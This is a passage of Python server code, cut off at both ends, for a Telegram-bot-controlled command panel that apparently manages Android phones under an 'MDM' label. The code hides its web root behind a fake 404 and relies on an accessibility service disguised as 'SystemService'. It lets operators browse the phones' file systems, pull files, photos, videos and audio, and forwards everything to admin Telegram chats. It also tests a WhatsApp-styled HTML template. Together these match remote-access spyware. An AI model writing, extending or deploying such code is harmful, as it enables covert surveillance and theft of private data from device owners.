        # Check if this is a file_list JSON response (for file explorer)
        if command == "ls":
            try:
                import json as _json
                # Handle both string and dict responses
                if isinstance(data, str):
                    file_data = _json.loads(data)
                elif isinstance(data, dict):
                    file_data = data
                else:
                    file_data = _json.loads(str(data))

                if file_data.get("type") == "file_list":
                    return _format_file_list_result(dev, file_data)
            except:
                pass

        # ✅ NEW: Check for media_list response (images/videos/audio)
        if command in ("media-images", "media-videos", "media-audio"):
            try:
                import json as _json
                if isinstance(data, str):
                    media_data = _json.loads(data)
                elif isinstance(data, dict):
                    media_data = data
                else:
                    media_data = _json.loads(str(data))

                if media_data.get("type") == "media_list":
                    return _format_media_list_result(dev, media_data)
            except:
                pass

        if len(text_resp) > 3000:
            text_resp = text_resp[:3000] + "\n... (مقتطع)"
        return (
            f"<b>📥 نتيجة الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"✅ <b>نجاح</b>\n\n"
            f"<code>{text_resp}</code>"
        )
    elif status == "error":
        return (
            f"<b>❌ خطأ في الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚠ {error or 'غير معروف'}"
        )
    elif status == "permission_required":
        # ⚠️ FIX: The app sends permissions in 'permissions_needed' field, not in 'data'
        perms = []
        if full_response and isinstance(full_response, dict):
            pn = full_response.get("permissions_needed", [])
            if isinstance(pn, list):
                perms = pn
        if not perms and isinstance(data, list):
            perms = data
        perm_list = "\n".join(f"  • {p}" for p in perms) if perms else "غير محدد"
        return (
            f"<b>🔒 صلاحيات مطلوبة</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"{perm_list}\n\n"
            f"💡 فعّل الصلاحيات من التطبيق على الهاتف"
        )
    else:
        return (
            f"<b>📋 حالة الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📌 {status}"
        )


# ═══════════════════════════════════════════════════════════════════════
# 7. TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════════

class MDMBot:
    def __init__(self, dm: DeviceStore, socketio=None):
        self.dm, self.socketio = dm, socketio
        self.bot = telebot.TeleBot(Config.BOT_TOKEN)
        self._pending: dict[int, dict] = {}
        self._register()

    def _ok(self, uid): return uid in Config.ADMIN_IDS

    @staticmethod
    def _guard(f):
        def w(self, m):
            uid = m.from_user.id
            if not self._ok(uid):
                logger.warning(f"محظور: uid={uid} chat={m.chat.id}")
                self.bot.reply_to(m, "⛔ غير مصرح.")
                return
            return f(self, m)
        return w

    def _notify_device_connect(self, dev):
        """Send auto-alert when device connects"""
        if not self.bot: return
        short_id = dev.get("short_id", "?")
        model = dev.get("model", "Unknown")
        version = dev.get("version", "?")
        ip = dev.get("ip", "?")

        html = (
            f"<b>🟢 جهاز جديد متصل!</b>\n\n"
            f"┌ <b>📋 التفاصيل</b>\n"
            f"├ 📱 الجهاز: <b>#{short_id}</b>\n"
            f"├ 📦 النموذج: {model}\n"
            f"├ 📲 الإصدار: Android {version}\n"
            f"└ 🌐 IP: <code>{ip}</code>"
        )
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton(f"⚙ التحكم في #{short_id}", callback_data=f"menu:select:{dev['device_id']}"))
        for admin_id in Config.ADMIN_IDS:
            try:
                self.bot.send_message(admin_id, html, parse_mode="HTML", reply_markup=kb)
            except Exception as e:
                logger.error(f"فشل إرسال تنبيه البوت: {e}")

    def _register(self):
        bot = self.bot

        @bot.message_handler(commands=["start"])
        def _s(m):
            uid = m.from_user.id
            if not self._ok(uid):
                bot.reply_to(m, "⛔ غير مصرح - معرفك غير في قائمة المديرين.")
                return

            devs = self.dm.get_all_devices()
            online_devs = self.dm.get_online_devices()
            stats = self.dm.get_stats()

            # Build beautiful dashboard
            dashboard_text = _format_dashboard(stats, devs)

            # Build keyboard based on device state
            if not devs:
                kb = InlineKeyboardMarkup(row_width=1)
                kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))
            elif len(online_devs) == 1:
                # Auto-open control panel for single online device
                dev = online_devs[0]
                kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
            elif len(online_devs) > 1:
                kb = InlineKeyboardMarkup(row_width=1)
                for d in online_devs:
                    kb.add(InlineKeyboardButton(f"🟢 #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                kb.add(InlineKeyboardButton("📋 كل الأجهزة", callback_data="menu:devices"))
            else:
                kb = InlineKeyboardMarkup(row_width=1)
                for d in devs:
                    se = _dev_status_emoji(d)
                    kb.add(InlineKeyboardButton(f"{se} #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))

            bot.send_message(m.chat.id, dashboard_text, parse_mode="HTML", reply_markup=kb)

        @bot.message_handler(commands=["help"])
        @MDMBot._guard
        def _h(m):
            bot.send_message(
                m.chat.id,
                "<b>🛡 دليل الاستخدام</b>\n\n"
                "• /start — لوحة التحكم الرئيسية\n"
                "• /devices — قائمة الأجهزة\n"
                "• /online — الأجهزة المتصلة\n"
                "• /stats — الإحصائيات\n"
                "• /cancel — إلغاء إدخال معامل\n\n"
                "👇 استخدم الأزرار للتحكم",
                parse_mode="HTML"
            )

        @bot.message_handler(commands=["devices"])
        @MDMBot._guard
        def _d(m):
            devs = self.dm.get_all_devices()
            if not devs:
                bot.reply_to(m, "📭 لا توجد أجهزة مسجلة بعد.")
                return
            lines = [f"<b>📱 قائمة الأجهزة</b> ({len(devs)})\n"]
            for d in devs:
                se = _dev_status_emoji(d)
                ago = _time_ago(d.get("last_seen"))
                lines.append(f"{se} <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["online"])
        @MDMBot._guard
        def _o(m):
            devs = self.dm.get_online_devices()
            if not devs:
                bot.reply_to(m, "🔴 لا توجد أجهزة متصلة حالياً.")
                return
            lines = [f"<b>🟢 الأجهزة المتصلة</b> ({len(devs)})\n"]
            for d in devs:
                lines.append(f"🟢 <b>#{d['short_id']}</b> {d.get('model', '?')} | <code>{d.get('ip', '?')}</code>")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["banned"])
        @MDMBot._guard
        def _b(m):
            devs = self.dm.get_banned_devices()
            if not devs:
                bot.reply_to(m, "✅ لا توجد أجهزة محظورة.")
                return
            lines = [f"<b>⛔ الأجهزة المحظورة</b> ({len(devs)})\n"]
            for d in devs:
                lines.append(f"⛔ <b>#{d['short_id']}</b> {d.get('model', '?')}")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["stats"])
        @MDMBot._guard
        def _st(m):
            s = self.dm.get_stats()
            bot.send_message(m.chat.id,
                f"<b>📊 الإحصائيات</b>\n\n"
                f"┌ 📱 إجمالي الأجهزة: <b>{s['total']}</b>\n"
                f"├ 🟢 متصل الآن: <b>{s['online']}</b>\n"
                f"├ 🔴 غير متصل: <b>{s['offline']}</b>\n"
                f"└ ⛔ محظور: <b>{s['banned']}</b>",
                parse_mode="HTML"
            )

        # ── معالج أزرار القائمة الرئيسية ──
        @bot.callback_query_handler(func=lambda c: c.data.startswith("menu:"))
        def _menu_handler(c: CallbackQuery):
            if not self._ok(c.from_user.id):
                bot.answer_callback_query(c.id, "⛔ غير مصرح")
                return
            parts = c.data.split(":")
            action = parts[1] if len(parts) > 1 else "home"
            cid = c.message.chat.id
            mid = c.message.message_id

            if action in ("home", "refresh"):
                devs = self.dm.get_all_devices()
                online_devs = self.dm.get_online_devices()
                stats = self.dm.get_stats()

                dashboard_text = _format_dashboard(stats, devs)

                if not devs:
                    kb = InlineKeyboardMarkup(row_width=1)
                    kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))
                elif len(online_devs) == 1:
                    dev = online_devs[0]
                    kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
                elif len(online_devs) > 1:
                    kb = InlineKeyboardMarkup(row_width=1)
                    for d in online_devs:
                        kb.add(InlineKeyboardButton(f"🟢 #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                    kb.add(InlineKeyboardButton("📋 كل الأجهزة", callback_data="menu:devices"))
                else:
                    kb = InlineKeyboardMarkup(row_width=1)
                    for d in devs:
                        se = _dev_status_emoji(d)
                        kb.add(InlineKeyboardButton(f"{se} #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                    kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))

                bot.edit_message_text(dashboard_text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action == "select":
                did = parts[2] if len(parts) > 2 else ""
                dev = self.dm.get_device(did)
                if not dev:
                    bot.answer_callback_query(c.id, "الجهاز غير موجود", show_alert=True)
                    return
                text = _format_device_card(dev)
                kb = control_panel_keyboard(did, dev.get("banned", False))
                bot.edit_message_text(text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action == "devices":
                devs = self.dm.get_all_devices()
                if not devs:
                    bot.answer_callback_query(c.id, "لا توجد أجهزة", show_alert=True)
                    return
                header = f"<b>📋 كل الأجهزة</b> ({len(devs)})\n\nاضغط على جهاز للتحكم:"
                kb = _devices_list_kb(devs, prefix="devices")
                bot.edit_message_text(header, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action in ("online", "devices", "banned") and len(parts) >= 4 and parts[2] == "select":
                did = parts[3]
                dev = self.dm.get_device(did)
                if not dev:
                    bot.answer_callback_query(c.id, "الجهاز غير موجود", show_alert=True)
                    return
                text = _format_device_card(dev)
                kb = control_panel_keyboard(did, dev.get("banned", False))
                bot.edit_message_text(text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action in ("online", "devices", "banned") and len(parts) >= 3 and parts[2] == "page":
                page = int(parts[3])
                if action == "online":
                    devs = self.dm.get_online_devices()
                    header = f"<b>🟢 الأجهزة المتصلة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "online"
                elif action == "banned":
                    devs = self.dm.get_banned_devices()
                    header = f"<b>⛔ الأجهزة المحظورة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "banned"
                else:
                    devs = self.dm.get_all_devices()
                    header = f"<b>📋 كل الأجهزة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "devices"
                kb = _devices_list_kb(devs, page=page, prefix=prefix)
                bot.edit_message_text(header, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

        # ── معالج أزرار لوحة التحكم (للأجهزة) ──
        @bot.callback_query_handler(func=lambda c: not c.data.startswith("menu:") and ":" in c.data)
        def _cq(c: CallbackQuery):
            if not self._ok(c.from_user.id):
                bot.answer_callback_query(c.id, "⛔")
                return
            p = c.data.split(":", 2)
            a, did, tgt = p[0], p[1] if len(p) > 1 else "", p[2] if len(p) > 2 else ""

            if a == "kb":
                fn = _KB.get(tgt)
                if not fn:
                    return
                if tgt == "control_panel":
                    dev = self.dm.get_device(did)
                    kb = control_panel_keyboard(did, banned=dev.get("banned", False) if dev else False)
                else:
                    kb = fn(did)
                dev = self.dm.get_device(did)
                text = _format_category_header(tgt, dev)
                bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
                                       reply_markup=kb, parse_mode="HTML")
                bot.answer_callback_query(c.id)

            elif a == "cmd":
                # ⚡ Resolve cache keys (for permission requests, file paths, etc.)
                tgt = _resolve_file_path(tgt)
                # ✅ Handle request-permission:<type> format
                if tgt.startswith("request-permission:"):
                    perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
                    self._send_cmd(c.message.chat.id, did, "request-permission", {"value": perm_type})
                # For ls command, default to /sdcard/ if no path specified
                elif tgt == "ls":
                    self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
                else:
                    self._send_cmd(c.message.chat.id, did, tgt)
                bot.answer_callback_query(c.id, "⚡ تم الإرسال")

            elif a == "filexplore":
                # File explorer navigation: open directory
                # tgt may be a cache key - resolve it to the full path
                file_path = _resolve_file_path(tgt)
                self._send_cmd(c.message.chat.id, did, "ls", {"value": file_path})
                bot.answer_callback_query(c.id, f"📂 فتح: {file_path[:40]}")

            elif a == "filedl":
                # File explorer: download file
                # tgt may be a cache key - resolve it to the full path
                file_path = _resolve_file_path(tgt)
                self._send_cmd(c.message.chat.id, did, "download-file", {"value": file_path})
                bot.answer_callback_query(c.id, f"📥 تحميل: {file_path[:40]}")

            elif a == "mediadl":
                # ✅ NEW: Media explorer: download media file by URI (cached)
                uri = _resolve_file_path(tgt)
                self._send_cmd(c.message.chat.id, did, "download-media", {"value": uri})
                bot.answer_callback_query(c.id, "📥 جاري تحميل الوسائط...")

            elif a == "param":
                self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
                ci = COMMANDS.get(tgt, {})
                bot.answer_callback_query(c.id)
                bot.send_message(c.message.chat.id,
                    f"<b>📩 إدخال معامل</b>\n\n"
                    f"⚙ <b>{ci.get('label', tgt)}</b>\n"
                    f"💡 <code>{ci.get('param_hint', '')}</code>\n\n"
                    f"/cancel للإلغاء",
                    parse_mode="HTML")

            elif a == "ban":
                self.dm.ban_device(did, reason="حظر من البوت")
                self._kick(did)
                bot.answer_callback_query(c.id, "⛔ تم الحظر")
                self._refresh(c, did)

            elif a == "unban":
                self.dm.unban_device(did)
                bot.answer_callback_query(c.id, "✅ تم إلغاء الحظر")
                self._refresh(c, did)

            elif a == "kick":
                self._kick(did)
                bot.answer_callback_query(c.id, "🔌 تم الطرد")
                self._refresh(c, did)

            elif a == "delete":
                self._kick(did)
                self.dm.delete_device(did)
                bot.answer_callback_query(c.id, "🗑 تم الحذف")
                bot.edit_message_text(
                    "<b>🗑 تم حذف الجهاز</b>\n\nاختر جهازاً آخر أو عد للرئيسية.",
                    c.message.chat.id, c.message.message_id,
                    reply_markup=InlineKeyboardMarkup(row_width=1).add(_home_btn()),
                    parse_mode="HTML"
                )

            elif a == "info_act":
                dev = self.dm.get_device(did)
                if dev:
                    bot.send_message(c.message.chat.id, _format_device_card(dev), parse_mode="HTML")
                bot.answer_callback_query(c.id)

        @bot.message_handler(commands=["cancel"])
        def _cc(m):
            self._pending.pop(m.chat.id, None)
            bot.reply_to(m, "✅ تم الإلغاء.")

        @bot.message_handler(func=lambda m: True)
        @MDMBot._guard
        def _t(m):
            cid = m.chat.id
            text = m.text.strip()

            # Handle pending parameter input
            if cid in self._pending:
                p = self._pending[cid]
                if "device_id" in p and "command" in p:
                    did = p["device_id"]
                    cmd = p["command"]
                    self._pending.pop(cid)
                    self._send_cmd(cid, did, cmd, text)
                    return

            # Direct device_id input
            did = text
            dev = self.dm.get_device(did)
            if not dev:
                bot.reply_to(m, f"❌ الجهاز <code>{did}</code> غير موجود.", parse_mode="HTML")
                return
            card_text = _format_device_card(dev)
            kb = control_panel_keyboard(did, dev.get("banned", False))
            kb.add(_home_btn())
            bot.send_message(cid, card_text, reply_markup=kb, parse_mode="HTML")

    def _send_cmd(self, cid, did, command, params=None):
        payload = build_command_payload(command, params)
        if not payload:
            self.bot.send_message(cid, "❌ أمر غير معروف.")
            return

        dev = self.dm.get_device(did)
        if not dev:
            self.bot.send_message(cid, "❌ <b>الجهاز غير مسجل</b>", parse_mode="HTML")
            return

        short_label = _dev_label(dev)
        lbl = COMMANDS.get(command, {}).get("label", command)

        # ⚡ INSTANT PUSH via Socket.IO
        sid = dev.get("sid")
        if sid and self.socketio:
            try:
                self.socketio.emit("command", payload, room=sid)
                _pending_cmds[sid] = {"cid": cid, "command": command, "device_id": did, "timestamp": time.time()}
                self.bot.send_message(cid, _format_cmd_sent(dev, command, params), parse_mode="HTML")
                logger.info(f"[Push] أمر فوري: {command} → #{dev['short_id']}")

                # ⚠️ NEW: 30-second timeout - if device doesn't respond, notify the user
                _ts_at_send = _pending_cmds[sid]["timestamp"]
                def _timeout_check():
                    # Check if the SAME command is still pending (not yet responded to)
                    pending = _pending_cmds.get(sid)
                    if pending and pending.get("timestamp") == _ts_at_send:
                        # Still pending after 30s → device didn't respond
                        _pending_cmds.pop(sid, None)
                        try:
                            self.bot.send_message(cid,
                                f"⏰ <b>انتهى وقت الانتظار</b>\n\n"
                                f"📱 {short_label}\n"
                                f"⚙ {lbl}\n"
                                f"━━━━━━━━━━━━━━━\n"
                                f"⚠ لم يصل رد من الجهاز خلال 30 ثانية.\n\n"
                                f"💡 تأكد من:\n"
                                f"  • التطبيق مفتوح وفي المقدمة\n"
                                f"  • الجهاز متصل بالإنترنت\n"
                                f"  • إمكانية الوصول (Accessibility) مفعّلة - افتح الإعدادات → إمكانية الوصول → فعّل SystemService\n"
                                f"  • أعد فتح التطبيق على الهاتف مرة واحدة",
                                parse_mode="HTML"
                            )
                        except Exception:
                            pass
                eventlet.spawn_after(30, _timeout_check)

            except Exception as e:
                logger.error(f"[Push] فشل الإرسال: {e}")
                self.bot.send_message(cid, f"❌ <b>فشل الإرسال</b>\n\n📱 {short_label}\n⚠ {e}", parse_mode="HTML")
        else:
            self.bot.send_message(cid,
                f"🔴 <b>الجهاز غير متصل</b>\n\n"
                f"📱 {short_label}\n"
                f"⚙ {lbl}\n\n"
                f"💡 الجهاز يحتاج أن يكون متصلاً لاستقبال الأوامر.",
                parse_mode="HTML"
            )

    def _kick(self, did):
        sid = self.dm.get_sid_for_device(did)
        if sid and self.socketio:
            try:
                self.socketio.emit("force_disconnect", {"reason": "kicked"}, room=sid)
                self.socketio.server.disconnect(sid)
            except Exception:
                pass

    def _refresh(self, c, did):
        dev = self.dm.get_device(did)
        if not dev:
            self.bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id)
            return
        text = _format_device_card(dev)
        kb = control_panel_keyboard(did, dev.get("banned", False))
        self.bot.edit_message_text(text, c.message.chat.id, c.message.message_id, reply_markup=kb, parse_mode="HTML")

    def setup_webhook(self):
        server_url = Config.SERVER_URL
        if not server_url:
            logger.warning("SERVER_URL not set - cannot setup webhook")
            return
        webhook_url = f"{server_url}/bot/webhook"
        try:
            self.bot.delete_webhook(drop_pending_updates=True)
            self.bot.set_webhook(url=webhook_url, allowed_updates=["message", "callback_query"])
            logger.info(f"Webhook configured: {webhook_url}")
        except Exception as e:
            logger.error(f"Webhook setup failed: {e}")

    def process_update(self, update_data):
        """Process a Telegram update using gevent for async compatibility"""
        def _process():
            try:
                update = telebot.types.Update.de_json(update_data)
                self.bot.process_new_updates([update])
            except Exception as e:
                logger.error(f"Error processing update: {e}")
        eventlet.spawn(_process)


def _devices_list_kb(devices, page=0, per_page=5, prefix="menu"):
    kb = InlineKeyboardMarkup(row_width=1)
    start = page * per_page
    end = start + per_page
    page_devs = devices[start:end]
    for d in page_devs:
        se = _dev_status_emoji(d)
        ago = _time_ago(d.get("last_seen"))
        label = f"{se} #{d['short_id']} {d.get('model', '?')} — {ago}"
        kb.add(InlineKeyboardButton(label, callback_data=f"{prefix}:select:{d['device_id']}"))
    total_pages = max(1, (len(devices) + per_page - 1) // per_page)
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("→ السابق", callback_data=f"{prefix}:page:{page - 1}"))
    nav.append(InlineKeyboardButton("🏠 الرئيسية", callback_data="menu:home"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("التالي ←", callback_data=f"{prefix}:page:{page + 1}"))
    kb.add(*nav)
    return kb


# ═══════════════════════════════════════════════════════════════════════
# 8. FLASK APP + CRYPTO + REST API
# ═══════════════════════════════════════════════════════════════════════

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger("MDM-Server")

app = Flask(__name__)
app.config["SECRET_KEY"] = Config.SECRET_KEY or Config.E2E_KEY

# Socket.IO with EIO v3 compatibility
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet",
                    ping_timeout=5, ping_interval=5)

# ── EIO v3 Compatibility Middleware ──
_original_wsgi_app = app.wsgi_app

def _eio_v3_middleware(environ, start_response):
    qs = environ.get("QUERY_STRING", "")
    if "EIO=3" in qs:
        environ = dict(environ)
        environ["QUERY_STRING"] = qs.replace("EIO=3", "EIO=4")
        logger.debug("EIO v3 → v4 query rewrite for Android client")
    return _original_wsgi_app(environ, start_response)

app.wsgi_app = _eio_v3_middleware
logger.info("EIO v3 compatibility middleware activated")

dm = DeviceStore()
logger.info("تم تهيئة مخزن الأجهزة (في الذاكرة)")

mdm_bot = None
if Config.BOT_TOKEN and ":" in Config.BOT_TOKEN:
    try:
        mdm_bot = MDMBot(dm, socketio)
        me = mdm_bot.bot.get_me()
        logger.info(f"تم تهيئة البوت: @{me.username} (ID: {me.id})")
    except Exception as e:
        logger.error(f"فشل تهيئة البوت: {e}")
        mdm_bot = None
else:
    logger.warning("البوت غير متاح - تأكد من BOT_TOKEN")


# ── Crypto Session Store ──
_sessions: dict[str, dict] = {}

# ── Socket.IO Push Command Tracking ──
_pending_cmds: dict[str, dict] = {}  # sid -> {cid, command, device_id}

def _derive_key(e2e_key, device_id, salt="mdm-e2e"):
    m = hmac.new(e2e_key.encode(), f"{device_id}:{salt}".encode(), hashlib.sha256).digest()
    return m[:32], m[16:32]

def _check_access():
    if not Config.LIVE_ACCESS_KEY: return True
    k = request.headers.get("X-Access-Key") or request.args.get("key", "")
    return hmac.compare_digest(k, Config.LIVE_ACCESS_KEY)


# ── Security Middleware ──
@app.before_request
def _security():
    p = request.path
    if p == "/" or p.startswith("/socket.io/") or p.startswith(("/ping", "/init", "/health", "/api/device/upload-media")): return None
    if p.startswith("/api/device/"): return None
    if p.startswith(("/renew", "/data", "/api/")):
        if not _check_access(): return jsonify({"success": False, "error": "unauthorized"}), 401


# ── Web Endpoints ──
@app.route("/")
def _index():
    # Dashboard is disabled - return 404 to hide the server
    return make_response("Not Found", 404)

@app.route("/ping")
def _ping():
    return jsonify({"status": "alive", "timestamp": datetime.now(timezone.utc).isoformat(),
                     "active_key_sessions": len(_sessions), "version": "7.0.0"}), 200

@app.route("/init", methods=["GET"])
def _init():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    if not Config.E2E_KEY: return jsonify({"success": False, "error": "E2E_KEY غير مضبوط"}), 500
    key, iv = _derive_key(Config.E2E_KEY, did)
    now = time.time()
    _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}
    return jsonify({"success": True, "device_id": did, "key": key.hex(), "iv": iv.hex(),
                     "algorithm": "AES-256-CBC", "key_length": 256,
                     "session_created": datetime.fromtimestamp(now, tz=timezone.utc).isoformat()}), 200

@app.route("/renew", methods=["POST"])
def _renew():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    s = _sessions.get(did)
    if not s: return jsonify({"success": False, "error": "استخدم /init أولاً"}), 404
    salt = f"mdm-e2e-{s.get('renew_count', 0) + 1}"
    key, iv = _derive_key(Config.E2E_KEY, did, salt)
    now = time.time()
    s["renewed_at"] = now; s["renew_count"] = s.get("renew_count", 0) + 1
    return jsonify({"success": True, "renew_count": s["renew_count"], "key": key.hex(), "iv": iv.hex(),
                     "algorithm": "AES-256-CBC",
                     "renewed_at": datetime.fromtimestamp(now, tz=timezone.utc).isoformat()}), 200

@app.route("/data", methods=["POST"])
def _data():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    f = request.files.get("file")
    meta = request.form.get("metadata", "")
    if f: data, name = f.read(), f.filename
    elif request.data: data, name = request.data, None
    else: return jsonify({"success": False, "error": "لا بيانات"}), 400
    d = os.path.join("uploads", did); os.makedirs(d, exist_ok=True)
    sn = name or f"{uuid.uuid4().hex}.enc"; sp = os.path.join(d, sn)
    with open(sp, "wb") as fh: fh.write(data)
    return jsonify({"success": True, "file": sn, "size": len(data)}), 200


# ── Media Upload → Forward to Telegram Bot ──
@app.route("/api/device/upload-media", methods=["POST"])
def _api_upload_media():
    """Receive file from device and forward directly to Telegram bot as media"""
    did = request.form.get("device_id", "") or request.args.get("device_id", "")
    command = request.form.get("command", "")
    file_type = request.form.get("file_type", "document")

    if not did:
        return jsonify({"success": False, "error": "device_id required"}), 400

    f = request.files.get("file")
    if not f:
        return jsonify({"success": False, "error": "no file"}), 400

    upload_dir = os.path.join("uploads", did)
    os.makedirs(upload_dir, exist_ok=True)
    filename = f.filename or f"{command}_{int(time.time())}"
    filepath = os.path.join(upload_dir, filename)
    file_data = f.read()
    with open(filepath, "wb") as fh:
        fh.write(file_data)

    dev = dm.get_device(did)
    short_label = _dev_label(dev) if dev else did
    lbl = COMMANDS.get(command, {}).get("label", command)
    caption = f"📥 <b>نتيجة الأمر</b>\n\n📱 <b>{short_label}</b>\n⚙ {lbl}\n━━━━━━━━━━━━━━━\n"

    if mdm_bot:
        for admin_id in Config.ADMIN_IDS:
            try:
                if file_type == "photo":
                    mdm_bot.bot.send_photo(admin_id, photo=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                elif file_type == "video":
                    mdm_bot.bot.send_video(admin_id, video=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                elif file_type == "audio":
                    mdm_bot.bot.send_audio(admin_id, audio=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                else:
                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال ملف للبوت: {e}")
                try:
                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                except Exception as e2:
                    logger.error(f"فشل إرسال مستند: {e2}")

    logger.info(f"[Media] ملف من #{dev.get('short_id', '?') if dev else '?'}: {filename} ({file_type})")
    return jsonify({"success": True, "file": filename, "size": len(file_data)}), 200

@app.route("/keys", methods=["GET"])
def _keys():
    # Disabled for security - return 404
    return make_response("Not Found", 404)

@app.route("/health", methods=["GET"])
def _health():
    return jsonify({"status": "ok", "devices": dm.get_stats(),
                     "version": "7.0.0"}), 200

@app.route("/debug", methods=["GET"])
def _debug():
    # Disabled for security - return 404
    return make_response("Not Found", 404)


# ⚡ أسطوري: Endpoint لاستقبال صورة PNG من القالب وإرسالها للبوت
@app.route("/api/device/test-template-image", methods=["POST"])
def _send_template_image():
    """Receive a PNG image and send it to all admin chats via Telegram bot.
    Used for testing the WhatsApp HTML template rendering.
    """
    if "image" not in request.files:
        return jsonify({"error": "No image file provided"}), 400

    image_file = request.files["image"]
    if not image_file.filename:
        return jsonify({"error": "Empty filename"}), 400

    caption = request.form.get("caption", "🖼️ قالب واتساب التجريبي")

    try:
        # Read image data
        image_data = image_file.read()
        from io import BytesIO
        bio = BytesIO(image_data)
        bio.seek(0)

        # Send to all admin chats
        if mdm_bot:
            sent_count = 0
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_photo(
                        admin_id,
                        photo=bio,
                        caption=caption,
                        parse_mode="HTML"
                    )
                    bio.seek(0)
                    sent_count += 1
                    logger.info(f"✅ Template image sent to admin {admin_id}")
                except Exception as e:
                    logger.error(f"❌ Failed to send to admin {admin_id}: {e}")

            return jsonify({
                "success": True,
                "sent_to": sent_count,
                "message": f"Image sent to {sent_count} admin(s)"
            }), 200
        else:
            return jsonify({"error": "Bot not initialized"}), 500

    except Exception as e:
        logger.error(f"❌ Template image send error: {e}", exc_info=True)
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════
# 9. REST API FOR ANDROID APP (Minimal - Socket.IO is PRIMARY)
# ═══════════════════════════════════════════════════════════════════════

@app.route("/api/device/register", methods=["POST"])
def _api_device_register():
    data = request.json or {}
    did = data.get("device_id", "")
    if not did:
        return jsonify({"success": False, "error": "device_id required"}), 400

    existing = dm.get_device(did)
    if existing and existing.get("banned"):
        return jsonify({"success": False, "error": "device banned", "banned": True}), 403

    extra_info = data.get("extra_info")
    if isinstance(extra_info, dict):
        import json as _json
        extra_info = _json.dumps(extra_info)

    result = {
        "success": True,
        "short_id": existing["short_id"] if existing else None,
        "message": "سجّل عبر Socket.IO الآن",
        "server_time": datetime.now(timezone.utc).isoformat()
    }

    if Config.LIVE_ACCESS_KEY:
        result["access_key"] = Config.LIVE_ACCESS_KEY
    if Config.E2E_KEY:
        key, iv = _derive_key(Config.E2E_KEY, did)
        result["e2e"] = {"key": key.hex(), "iv": iv.hex(), "algorithm": "AES-256-CBC"}
        if did not in _sessions:
            now = time.time()
            _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}

    logger.info(f"[REST] تسجيل مبدئي: {did}")
    return jsonify(result), 200


@app.route("/api/device/response", methods=["POST"])
def _api_device_response():
    data = request.json or {}
    did = data.get("device_id", "")
    cmd = data.get("command", "?")
    status = data.get("status", "?")
    logger.info(f"[REST-fallback] استجابة: {did} cmd={cmd} status={status}")

    if mdm_bot and did:
        dev = dm.get_device(did)
        # ⚠️ FIX: _pending_cmds is keyed by SID, not DID. Use the device's sid.
        sid = dev.get("sid") if dev else None

        # ⚠️ CRITICAL: status="info" is an intermediate update - DO NOT consume pending
        if status == "info":
            if sid and dev:
                pending = _pending_cmds.get(sid)
                if pending:
                    cid = pending["cid"]
                    try:
                        short_label = _dev_label(dev)
